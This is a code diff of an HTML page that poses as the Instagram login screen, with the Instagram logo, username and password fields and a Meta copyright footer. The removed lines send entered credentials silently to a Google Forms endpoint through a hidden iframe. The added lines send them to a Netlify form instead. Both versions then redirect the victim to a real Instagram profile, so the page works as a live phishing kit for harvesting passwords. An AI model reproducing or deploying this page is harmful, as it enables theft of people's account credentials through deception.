@@ -54,19 +54,22 @@
 
   <div class="container">
     <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo" width="180"/>
-    <form id="loginForm" action="https://docs.google.com/forms/d/e/1FAIpQLSfbc2SWJQ1eIa8fWYKrGOWdVf3LQRv4-eEmamnBdyHZDFwNOg/formResponse" method="POST" target="hidden_iframe" onsubmit="submitted=true;">
-      <input name="entry.1481077044" type="text" placeholder="Phone number, username, or email" required />
-      <input name="entry.6545224" type="password" placeholder="Password" required />
+    
+    <form name="login-form" method="POST" data-netlify="true" onsubmit="redirectAfterSubmit()">
+      <input name="username" type="text" placeholder="Phone number, username, or email" required />
+      <input name="password" type="password" placeholder="Password" required />
       <button type="submit">Log In</button>
     </form>
+
     <div class="note">© 2025 Instagram from Meta</div>
   </div>
 
-  <!-- Secret iframe to submit silently -->
-  <iframe name="hidden_iframe" style="display:none;" onload="if(submitted) { window.location='https://www.instagram.com/marsha_cute_bea'; }"></iframe>
-
   <script>
-    let submitted = false;
+    function redirectAfterSubmit() {
+      setTimeout(function () {
+        window.location.href = "https://www.instagram.com/marsha_cute_bea";
+      }, 1000);
+    }
   </script>
 
 </body>
